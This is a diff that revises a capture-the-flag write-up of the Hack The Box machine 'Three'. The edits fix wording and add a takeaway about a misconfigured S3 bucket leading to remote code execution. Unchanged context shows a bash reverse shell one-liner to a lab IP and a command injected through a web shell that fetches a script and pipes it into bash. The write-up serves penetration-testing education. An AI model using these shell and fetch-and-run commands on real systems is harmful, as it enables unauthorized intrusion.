@@ -43,7 +43,7 @@ gobuster vhosts -w /usr/share/seclists/DNS/subdomains-top1million-5000.txt -u ht
 ![Vhost-Enumeration](Images/three_vhostenum.jpeg)
 
 
-Gobuster revealed that the sub-domain s3.thetoppers.htb exists. Visited the subdomain using a browser to confirm that the service is indeed running.
+Gobuster revealed that the sub-domain S3.thetoppers.htb exists. Visited the subdomain using a browser to confirm that the service is indeed running.
 
 ![S3-Status](Images/three_s3-confirmation.jpeg)
 
@@ -57,7 +57,7 @@ aws --endpoint=http://thetoppers.htb s3 ls s3://thetoppers.htb
 ![S3-Bucket-Objects](Images/three_bucket-objects.jpeg)
 
 
-The s3 bucket object index.php confirmed that the website is running PHP
+The S3 bucket object index.php confirmed that the website is running PHP
 
 ---
 
@@ -93,7 +93,7 @@ Confirmed the existence of the uploaded shell by navigating to http://s3.thetopp
 
 #### Preparing the Reverse Shell & Listener ####
 
-Created a Bash reverse shell (shell.sh) that establishes a TCP connection to the attacker's machine and redirects the stdin, stdout, and stderr over the connection 
+Created a Bash reverse shell (shell.sh) that established a TCP connection to the attacker's machine and redirects the stdin, stdout, and stderr over the connection 
 
 ```bash
 bash -i >& /dev/tcp/10.10.17.95/1337 0>&1
@@ -121,7 +121,7 @@ python3 -m http.server 8000
 #### Executing the payload ####
 
 
-Using the previously established Remote Code Execution (RCE), inserted a bash command into the `cmd` URL parameter causing the server to fetch the reverse shell payload that hosted on the Python Web Server. Used the pipe to pass the downloaded script was then piped directly into `bash` for execution.
+Using the previously established Remote Code Execution (RCE), inserted a bash command into the `cmd` URL parameter causing the server to fetch the reverse shell payload that was hosted on the Python Web Server. Used the pipe to pass the downloaded script directly into `bash` for execution.
 
 
 ```bash 
@@ -148,4 +148,6 @@ cat /var/www/flag.txt
 
 ## Key Takeaway
 
+The biggest takeaway from this lesson was not only how multiple small findings could be chained together in order to achieve a full system compromise but also the severity of a misconfigured S3 bucket. The root cause was the misconfigured S3 bucket, which allowed unauthenticated file uploads. The S3 bucket also served as the web application's document root and was configured to process PHP files. This meant that attackers could achieve remote code execution by uploading a malicious PHP web shell. Upon a successful upload, the PHP web shell could be accessed through a browser using the cmd parameter. The remote code execution could then be leveraged to establish a reverse shell. 
 
+The machine demonstrated that even a simple cloud misconfiguration can escalate intoremote code execution, given insecure web server configuration. It articulated the importance of pursuing every potential lead during the enumeration phase, such as the email address that was found on the Contact page. This email provided the domain required for virtual host enumeration, which ultimately led to the discovery of the S3 bucket
